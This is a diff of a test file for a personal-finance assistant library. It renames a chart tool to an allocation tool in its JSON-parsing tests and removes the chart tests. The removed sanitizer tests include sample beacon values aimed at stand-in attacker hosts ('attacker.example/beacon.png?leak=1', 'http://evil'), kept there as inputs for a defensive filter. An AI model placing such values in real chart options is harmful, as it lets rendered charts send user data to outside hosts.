@@ -18,11 +18,8 @@ import {
   looksLikeStall,
   routeTool,
   runTool,
-  sanitizeEChartsOption,
   savingsGoalsToolResult,
-  shouldDefaultChart,
   validateSelect,
-  wantsNonPieChart,
 } from "@/lib/assistant";
 
 /**
@@ -144,13 +141,13 @@ describe("extractSql", () => {
 describe("extractJsonAfter", () => {
   it("returns the first balanced object after the marker", () => {
     expect(
-      extractJsonAfter('call display_echart {"a": {"b": [1, 2]}} tail', "display_echart"),
+      extractJsonAfter('call propose_allocation {"a": {"b": [1, 2]}} tail', "propose_allocation"),
     ).toEqual({ a: { b: [1, 2] } });
   });
 
   it("is not fooled by braces inside strings", () => {
     expect(
-      extractJsonAfter('display_echart {"label": "a } b", "n": 1}', "display_echart"),
+      extractJsonAfter('propose_allocation {"label": "a } b", "n": 1}', "propose_allocation"),
     ).toEqual({ label: "a } b", n: 1 });
   });
 
@@ -158,10 +155,10 @@ describe("extractJsonAfter", () => {
     // The anchor lands on the prose mention, so the first object is the wrapper.
     expect(
       extractJsonAfter(
-        'I will use display_echart. [{"display_echart": {"option": {"series": []}}}]',
-        "display_echart",
+        'I will use propose_allocation. [{"propose_allocation": {"allocations": []}}]',
+        "propose_allocation",
       ),
-    ).toEqual({ option: { series: [] } });
+    ).toEqual({ allocations: [] });
   });
 
   it("leaves a direct (non-wrapper) args object untouched", () => {
@@ -171,7 +168,7 @@ describe("extractJsonAfter", () => {
   });
 
   it("returns undefined for unbalanced or invalid JSON", () => {
-    expect(extractJsonAfter('display_echart {"a": ', "display_echart")).toBeUndefined();
+    expect(extractJsonAfter('propose_allocation {"a": ', "propose_allocation")).toBeUndefined();
   });
 });
 
@@ -299,8 +296,8 @@ describe("runTool get_savings_potential", () => {
     monthly: [],
   } as unknown as Dashboard;
 
-  it("splits fixed costs from the flexible categories and charts only the latter", () => {
-    const { result, chart } = runTool("get_savings_potential", dashboard);
+  it("splits fixed costs from the flexible categories", () => {
+    const { result } = runTool("get_savings_potential", dashboard);
     const payload = result as {
       fixed_categories: string[];
       fixed_costs_chf: string;
@@ -314,7 +311,6 @@ describe("runTool get_savings_potential", () => {
       "Travel",
       "Clothing",
     ]);
-    expect(chart?.slices.map((s) => s.label)).toEqual(["Travel", "Clothing"]);
   });
 });
 
@@ -537,22 +533,6 @@ describe("anomaliesToolResult", () => {
   });
 });
 
-describe("shouldDefaultChart", () => {
-  it("attaches a default chart to money-composition questions", () => {
-    expect(shouldDefaultChart("How am I doing with spending?")).toBe(true);
-    expect(shouldDefaultChart("Who are my top merchants?")).toBe(true);
-    expect(shouldDefaultChart("Give me an overview of my finances")).toBe(true);
-    expect(shouldDefaultChart("How is my income split?")).toBe(true);
-  });
-
-  it("does not chart row-level, count, or scalar questions", () => {
-    expect(shouldDefaultChart("What was my single largest expense?")).toBe(false);
-    expect(shouldDefaultChart("How many transactions did I make in March?")).toBe(false);
-    expect(shouldDefaultChart("How much did I save this year?")).toBe(false);
-    expect(shouldDefaultChart("Hi there")).toBe(false);
-  });
-});
-
 describe("defaultPeriod", () => {
   it("defaults an unscoped question to year-to-date", () => {
     expect(defaultPeriod("Where does my money go?")).toBe("ytd");
@@ -563,76 +543,6 @@ describe("defaultPeriod", () => {
     expect(defaultPeriod("Show my spending over all time")).toBeUndefined();
     expect(defaultPeriod("What are my biggest merchants ever?")).toBeUndefined();
     expect(defaultPeriod("my lifetime savings")).toBeUndefined();
-  });
-});
-
-describe("wantsNonPieChart", () => {
-  it("detects an explicit bar/line chart request", () => {
-    expect(wantsNonPieChart("Show me a bar chart of spending per month")).toBe("bar");
-    expect(wantsNonPieChart("plot it as a line")).toBe("line");
-  });
-
-  it("does not fire on incidental words or when a pie is asked for", () => {
-    expect(wantsNonPieChart("What's my bottom line this year?")).toBeUndefined();
-    expect(wantsNonPieChart("How much did I spend at the coffee bar?")).toBeUndefined();
-    expect(wantsNonPieChart("Show my categories as a pie, not a bar chart")).toBeUndefined();
-  });
-});
-
-describe("sanitizeEChartsOption", () => {
-  const series = [{ type: "bar", data: [1, 2] }];
-
-  it("keeps an ordinary option", () => {
-    const option = sanitizeEChartsOption({
-      xAxis: { type: "category", data: ["a", "b"] },
-      series,
-    });
-    expect(option).toBeDefined();
-    expect(option).toHaveProperty("series");
-  });
-
-  it("strips graphic, image, tooltip, and toolbox everywhere", () => {
-    const option = sanitizeEChartsOption({
-      graphic: [{ type: "image" }],
-      tooltip: { formatter: "x" },
-      toolbox: { feature: {} },
-      series: [{ type: "bar", data: [1], itemStyle: { color: { image: "http://evil" } } }],
-    }) as Record<string, unknown>;
-    expect(option).toBeDefined();
-    expect(JSON.stringify(option)).not.toMatch(/graphic|image|tooltip|toolbox|evil/);
-  });
-
-  it("drops image:// and path:// string values (SSRF/beacon vector)", () => {
-    const option = sanitizeEChartsOption({
-      series: [
-        {
-          type: "scatter",
-          symbol: "image://https://attacker.example/beacon.png?leak=1",
-          data: [[1, 1]],
-        },
-      ],
-    }) as Record<string, unknown>;
-    expect(option).toBeDefined();
-    expect(JSON.stringify(option)).not.toMatch(/attacker\.example|image:\/\//);
-    // A per-datum symbol and markPoint symbol carry the same value — also gone.
-    const nested = sanitizeEChartsOption({
-      series: [
-        {
-          type: "line",
-          data: [{ value: 1, symbol: "image://https://x.test/p.png" }],
-          markPoint: { data: [{ symbol: "path://M0,0" }] },
-        },
-      ],
-    }) as Record<string, unknown>;
-    expect(JSON.stringify(nested)).not.toMatch(/x\.test|image:\/\/|path:\/\//);
-  });
-
-  it("rejects non-objects, series-less options, and oversized payloads", () => {
-    expect(sanitizeEChartsOption("SELECT")).toBeUndefined();
-    expect(sanitizeEChartsOption({ xAxis: {} })).toBeUndefined();
-    expect(
-      sanitizeEChartsOption({ series, blob: "x".repeat(30_000) }),
-    ).toBeUndefined();
   });
 });
 
@@ -669,16 +579,16 @@ describe("parseAllocationArgs sweep fencing", () => {
 describe("extractJsonAfter retry", () => {
   it("skips an unparseable balanced region and finds the real arguments", () => {
     const content =
-      'display_echart takes an option like {series: [1]} — here: {"display_echart": {"option": {"series": [{"type": "bar", "data": [1]}]}}}';
-    const args = extractJsonAfter(content, "display_echart") as Record<string, unknown>;
+      'propose_allocation takes arguments like {allocations: [1]} — here: {"propose_allocation": {"allocations": [{"goal": "Ferien", "amount_chf": 1}]}}';
+    const args = extractJsonAfter(content, "propose_allocation") as Record<string, unknown>;
     expect(args).toBeTruthy();
-    expect(args.option).toBeTruthy();
+    expect(args.allocations).toBeTruthy();
   });
 
   it("steps inside an unclosed prose brace to reach a balanced object", () => {
-    const content = 'display_echart {broken and never closed {"option": {"series": []}}';
-    const args = extractJsonAfter(content, "display_echart") as Record<string, unknown>;
-    expect(args).toEqual({ option: { series: [] } });
+    const content = 'propose_allocation {broken and never closed {"allocations": []}';
+    const args = extractJsonAfter(content, "propose_allocation") as Record<string, unknown>;
+    expect(args).toEqual({ allocations: [] });
   });
 });
 
